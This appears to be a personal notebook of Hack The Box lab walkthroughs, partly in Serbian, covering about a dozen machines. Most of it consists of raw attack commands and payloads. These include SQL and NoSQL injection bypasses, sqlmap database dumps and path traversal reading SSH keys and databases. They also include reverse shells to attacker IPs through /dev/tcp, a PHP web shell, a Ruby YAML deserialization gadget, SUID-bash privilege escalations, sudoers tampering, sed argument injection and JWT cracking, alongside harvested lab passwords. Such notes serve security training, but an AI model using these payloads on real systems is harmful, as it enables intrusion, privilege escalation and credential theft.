******************************************* Trick - EASY *****************************************************************
SMTP,DNS 53 / UDP 53, SQL, LFI, fail2ban

nmap -p- --min-rate 10000 10.10.11.166 = OpenSSH and Apache version running
nmap -p 25 --script=smtp-enum-users 10.10.11.166

SMTP - TCP 25
nmap -p 25 --script=smtp-enum-users 10.10.11.166.   ---> FALL
telnet 10.10.11.166 25
VRFY root
VRFY sasa
smtp-user-enum script will automate checks - https://github.com/cytopia/smtp-user-enum
smtp-user-enum -m VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t 10.10.11.166 25

DNS - TCP 53 / UDP 53
dig +noall +answer @10.10.11.166 trick.htb
dig +noall +answer @10.10.11.166 -x 10.10.11.166 - reverse lookup
dig +noall +answer @10.10.11.166 axfr trick.htb. - found -> preprod-payroll.trick.htb!

WFUZZ
   wfuzz -u http://10.10.11.166 -H "Host: FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -hh 5480
    

trick.htb - TCP 80
Putting an email into the form doesn’t do anything.
feroxbuster -u http://trick.htb. - nothing

preprod-payroll.trick.htb
The page title is “Employee’s Payroll Management System”:  GOOGLE IT
this is software made by - https://www.sourcecodester.com/php/14475/payroll-management-system-using-phpmysql-source-code.html
' or 1=1--  on username and password and we are in !!!! - This is actually a CVE in this software, CVE-2022-28468.
Enemigoss - SuperGucciRainbowCake

SQL map identification - Drugi nacin da izvucemo kredenicjale:
admin admin and capture request in burp as login.req
sqlmap -r login.req --batch
sqlmap -r login.req --batch --technique B --level 5
sqlmap -r login.req --batch --threads 10 --current-user
sqlmap -r login.req --batch --threads 10 -D payroll_db --tables
sqlmap -r login.req --batch --threads 10 -D payroll_db -T users --dump
DONE :)

sqlmap -r login.req --batch --threads 10 --file-read=/etc/hostname
cat /home/oxdf/.sqlmap/output/preprod-payroll.trick.htb/files/_etc_hostname 
cat /home/oxdf/.sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd | grep sh$

wfuzz -u http://10.10.11.166 -H "Host: preprod-FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 5480
MARKETING!!!

LFI bingo and found michael user:
http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd

http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa
view page source moze +
Private KEY sacuvati u fajl =  wget "http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa" -O id_rsa
chmod 600 id_rsa
ssh michael@10.10.11.166 -i ./id_rsa
USER : 8d0606ce8e2b73af5fd23db96de3fb3fali poslednje i prvo slovo azbuke

Privilege escalation
sudo -l  = fail2ban restart as root
id
find / -group security 2>/dev/null
ls -ld /etc/fail2ban/action.d/
crackmapexec ssh trick.htb -u sasa -p /usr/share/wordlists/rockyou.txt we should blocked!!!

three fail2ban configurations
/etc/fail2ban/jail.conf
/etc/fail2ban/action.d/iptable-multiport.conf


Michael’s account does not have permission to write to it!!!
michael@trick:~$ ls -l /etc/fail2ban/action.d/iptables-multiport.conf

da bi se izborili s ovim fajlom i dobili permisije:
cp iptables-multiport.conf iptables-multiport.conf.bak. - ovo mora brzo
rm iptables-multiport.conf. - ovo mora brzo
cp iptables-multiport.conf.bak iptables-multiport.conf - ovo mora brzo

vim iptables-multiport.conf ispisemo:
actionban = chmod +s /bin/bash  
actionunban = chmod +s /bin/bash

1.crackmapexec ssh trick.htb -u sasa -pi /usr/share/wordlists/rockyou.txt(ili neki drugi recnik)
 PUSTIMO DUZE da bude da ide
2.sudo /etc/init.d/fail2ban restart
 i onda posle duzeg pokusaja probamo:
 
ls -l /bin/bash
bash -p i BINGO!!!!!

******************************************* Paper *****************************************************************
Easy, Wordpress

nmap
Response : X-Backend-Server: office.paper
wpscan --url "http://office.paper" -v -e ap --plugins-detection aggressive
https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/?static=1
http://chat.office.paper/register/8qozr226AhkCHZdyY
recyclops --> recyclops list ../.ssh/ --> recyclops list ../hubot/ --> recyclops file ../hubot/.env
ssh dwight@IP -->
python -m http.server --> downlaod to server linpeas.sh /tmp OR curl 10.10.14.38:8000/linpeas.sh -o linpeas.sh
https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
./leanpeas.sh --> https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.29
on victim server: curl 10.10.14.38:8000/50011.sh -o 50011.sh --> ./50011.sh --> su - hacked - password .. sudo su
**********************************Stocker*********************************************************************
NoSQL, API,

nmap 10.10.11.196
curl -s 10.10.11.196 -I | grep Location
gobuster vhost -u http://stocker.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100
dev.stocker.htb
After trying several things we can change the request to cause a no sql injection

We have examples in hacktricks, remember to change the Content-Type to application/json
https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass

*******************************************************UpDown**********************************************
nmap 10.10.11.177
curl -s 10.10.11.177 | html2text
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u siteisup.htb -t 100
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u siteisup.htb/dev -t 100
curl -s http://siteisup.htb/dev/.git/ | html2text
wget -c -r -np -nc -L -p http://siteisup.htb/dev/.git/ &>/dev/null
siteisup.htb/dev ❯ git log --oneline
siteisup.htb/dev ❯ git show 8812785
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u siteisup.htb -t 100

ne mogu da pristupim : dev.siteisup.htb
*******************************Precius***************************************************
pdfkit, ruby, 
nmap 10.10.11.189
curl -s 10.10.11.189 -I | grep Location:
sudo python3 -m http.server 8000
odemo na sajt i upisemo u Enter url search nasu adresu:8000
exiftool imekojje smo skinuli.pdf 
Generated by pdfkit v0.8.6

https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-
http://example.com/?name=#{'%20`sleep 5`'}
http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"`'}  -> stavimo u polje
sudo netcat -lvnp 443
ruby@precious:~$ ls -la
ruby@precious:~/.bundle$ cat config    -> BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
ssh henry@10.10.11.189  -> Q3c1AqGHtoI0aXAYFH
sudo -l
cat /opt/update_dependencies.rb | head -n11 | tail -n3

https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml

napravi fajl dependencies.yml:
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod u+s /bin/bash
         method_id: :resolve

sudo ruby /opt/update_dependencies.rb 2>/dev/null
ls -l /bin/bash
bash -p 
boom!!!!!
id
cat /root/root.txt

***********************************HEALTH*************************************************
nmap 10.10.11.176 - moraa na host machinni!!!
ssh susanne@10.10.11.176 february15

https://github.com/DominicBreuker/pspy
susanne@health:/var/www/html$ cat .env | grep DB
susanne@health:/var/www/html/app/Http/Controllers$ cat HealthChecker.php | grep file -A8 -B4

*********************************SOCCER****************************************************
tiny, linux, sql injection, websocat, bin/bash
nmap -sV -sS -sC 10.10.11.194
gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
tiny file manager default credentials - admin:admin@123
tiny -> upload -> shell.php:
?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'")
?>

sudo netcat -lvnp 443
curl soccer.htb/tiny/uploads/shell.php

www-data@soccer:~/html/tiny/uploads$ ifconfig | grep "inet "

Install Websocat:
sudo wget -qO /usr/local/bin/websocat https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl
sudo chmod a+x /usr/local/bin/websocat
websocat --version
websocat ws://soccer.htb:9091 -v

vulnerability:
https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

Zameniti:
ws_server = "ws://localhost:8156/ws"   -> ws_server = "ws://soccer.htb:9091/"           

data = '{"employeeID":"%s"}' % message --> data = '{"id":"%s"}' % message

python3 exploit.py - neka radi a u drugom prozoru:

sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -dbs
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -tables
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -columns
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -C username,password -dump
player   | PlayerOftheMatch2022

ssh player@10.10.11.194   password : PlayerOftheMatch2022
user.txt

player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas  ---> ovo nam je zanimljivo
player@soccer:/usr/local/etc$ cat doas.conf  --> no permissions!!!
player@soccer:~$ doas -u root /usr/bin/dstat

We have writability in the share/dstat path, where the plugins are stored
player@soccer:~$ ls -la /usr/local/share/dstat

player@soccer:/usr/local/share/dstat$ echo 'import os;os.system("chmod u+s /bin/bash")' > dstat_privesc.py
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --privesc &>/dev/null
player@soccer:/usr/local/share/dstat$

******************************************SHOPPY********************************************************************
sql injection, shoppy admin app, docker, gtfobins,
nmap -sS -sC -sV 10.10.11.
curl -s 10.10.11.180 -I | grep Location
apt -y install seclists
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -u shoppy.htb
/admin  --> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads
admin'||'1==1   x2!! jos jednom u pretrazi i nalazimo download file!!! 

make file hashes
admin:23c6877d9e2b564ef8b32c3a23de27b2
josh:6ebcea65320589ca4f2f1ce039975995

john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --format=Raw-
nadjeno - remembermethisway (josh)

gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u shoppy.htb
mattermost.shoppy.htb (remembermethisway (josh)) je nadjen u /etc/hosts ga dodati 

Hey @josh,  
For the deploy machine, you can create an account with these creds :
username: jaeger
password: Sh0ppyBest@pp!  

ssh jaeger@10.10.11.180    ----> USERTEXT!!!!

sudo -l
sudo -u deploy /home/deploy/password-manager   --> probaj s test
sudo -u deploy /home/deploy/password-manager     ---> Sample

NOVI TAB:
sshpass -p 'Deploying@pp!' ssh deploy@10.10.11.180

Uz pomoc:
https://gtfobins.github.io/gtfobins/docker/#shell
postoji nacin da dobijemo root. Pokrecemo container, s root privilegijama, i procitati flag.

deploy@shoppy:~$ 
id, whoami -- cat/root/root.txt  :) ali jos uvek nismo root
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
exit
sudo -l
sudo su
id

**************************************************AMBASADOR*********************************************
sudo nmap -sV -sC -sS 10.10.11.183
container, hashicorp, nosql,LFI and path traversal, grafana

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
3306/tcp open  mysql

http://10.10.11.183:3000/login

searchsploit grafana

curl -s --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$

curl -s --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db  -preuzmi bazu = ovde smo i nasli kredencijale mysql = dontStandSoCloseToMe63221!

mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!

show databases;
use whackywidget;
show tables;
select * from users;
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
ssh developer@10.10.11.183    password: anEnglishManInNewYork027468  === USER.TXT

developer@ambassador:/opt/my-app$ git log --oneline
git show 33a53ef   (ovde nalazimo i token)

https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API
python3 -m http.server 8080 - curl http://10.10.14.8:8080/exploit -o exploit.py
developer@ambassador:~$ python3 exploit.py 127.0.0.1 8500 10.10.14.10 443 bb03b43b-1d81-d62b-24b5-39540ee469b5

sudo netcat -lvnp 443 

PROVEZBAJ, NA HTB SAM KOMPLETIRAO!!!!!
**********************************************METATWO*********************************************************
Web, wordpress,ssh,ftp

nmap 10.10.11.186
curl -s 10.10.11.186 -I | grep Location
whatweb metapress.htb. 
wpscan --url - nasli smo ranjivost za wordpress 5.6.2:
https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357

metapress.htb/events



ssh jnelson@10.10.11.186
jnelson@10.10.11.186's password: Cb4_JmWM8zUZWMu@Ys
ls -a
cat .passpie/.keys | tail -n45

123456

PROVEZBAJ!!!!!!!!ZAVRSENA NA HTB

******************************************************AWKWARD**********************************************
API, jwt, linux, privies

sudo nmap -sS -sV -sC 10.10.11.185
curl 10.10.11.185

curl -s http://hat-valley.htb/js/app.js | grep routes | sed 's/path:/\n/g' | grep '\ \\"\/' | awk '{print $2}' FS='"' | tr -d \\
curl -s http://hat-valley.htb/js/app.js | sed 's/baseURL + /\n/g' | grep "return response" | awk '{print $2}' FS="'" 
curl -s http://hat-valley.htb/api/staff-details | jq   ----> dobijamo spisak korisnika!!!

cat hashes
christine.wool:6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1
jackson.lightheart:b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436
bean.hill:37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f

tar -xzf rockyou.txt.gz

john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --format=Raw-SHA256
chris123         (christopher.jones)
login on http://hat-valley.htb/hr
burp suite-> intercept down (refresh button)

We can take advantage of an SSRF to point to local ports and fuzz them
seq 1 10000 > ports
wfuzz -c -w ./ports -u 'http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ"' -t 200 --hh 0

mozemo videti port 3002 otvoren i api dokumentaciju!!!
http://hat-valley.htb/api/store-status?url="http://localhost:3002" na toj stranici imamo:
awk '/" + user + "/' /var/www/private/leave_requests sto pretvaramo u:
awk '//' /etc/passwd ' /' /var/www/private/leave_requests.csv
ali prvo da proverimo jwt token:

https://github.com/Sjord/jwtcrack
python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2ODk3NjUyfQ.ytZPNf2u7HNSns85xli9yZxIdbtpM_4Dq2wJ1J09fpU > hash
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash   - 123beany123 (ovo ide u jwt.io u verify signature)
https://jwt.io/
{
    "username" : "/' /etc/passwd '",
    "iat" : "1666897652"
}
token kopiramo u Burp repeater token polje, GET /api/all-leave
cat all-leave | grep sh$ 

python3 exploit.py /home/bean/.bashrc | grep alias | grep -vE "^\s|^$|^#"  - nije mi radila skripta!!!
python3 exploit.py /home/bean/Documents/backup_home.sh 
python3 exploit.py /home/bean/Documents/backup/bean_backup_final.tar.gz -d
ls
tar -xf bean_backup_final.tar.gz &>/dev/null
ls
tar -xf bean_backup.tar.gz
ls
cat .config/xpad/content-DS1ZS1
bean.hill
014mrbeanrules!#P
ssh bean@10.10.11.185   user.txt!!!!!!!
014mrbeanrules!#P

gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u hat-valley.htb -t 200
store.hat-valley.htb  ---> credentials are admin:014mrbeanrules!#

Reading php files from store, we find that it executes sed and some arguments that we can exploit since the item_id is something that we can control
bean@awkward:/var/www/store$ cat cart_actions.php  | grep sed   --> dobijamo:

        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");

To do this, first we go to shop and add anything to the shopping cart
bean@awkward:/var/www/store/cart$ ls   --> 4a46-6516-45e-83f0
bean@awkward:/var/www/store/cart$ cat 4a46-6516-45e-83f0

bean@awkward:/tmp$ cat rev.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.10/443 0>&1
bean@awkward:/tmp$ chmod +x rev.sh

We need to modify the file that was created, but we don't have permission so we make a copy of it, delete it and rename the copy
bean@awkward:/var/www/store/cart$ cp c4ff-1de5-810-ca97 bak
bean@awkward:/var/www/store/cart$ rm -f c4ff-1de5-810-ca97 
bak treba da izgleda:
***Hat Valley Cart***
item_id=1' -e "1e /tmp/rev.sh" /tmp/rev.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90

bean@awkward:/var/www/store/cart$ cp bak c4ff-1de5-810-ca97
bean@awkward:/var/www/store/cart$
bean@awkward:/var/www/store/cart$ cat c4ff-1de5-810-ca97 

***Hat Valley Cart***
item_id=1' -e "1e /tmp/rev.sh" /tmp/rev.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90

Burp intercept request and then forward (above payload should pop up in request)

sudo netcat -lvnp 443
www-data@awkward:~/private$ cat leave_requests.csv 
With pspy - https://github.com/DominicBreuker/pspy - we can see that root runs some of them  OR:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
https://gtfobins.github.io/gtfobins/mail/  - posto vec imamo rev.sh u /tmp

www-data@awkward:~/private$ echo '" --exec="\!/tmp/rev.sh"' >> leave_requests.csv
sudo netcat -lvnp 443  --- boom dobijamo !!!!!!!!!!!

*****************************************Mentor**********************************************

API,













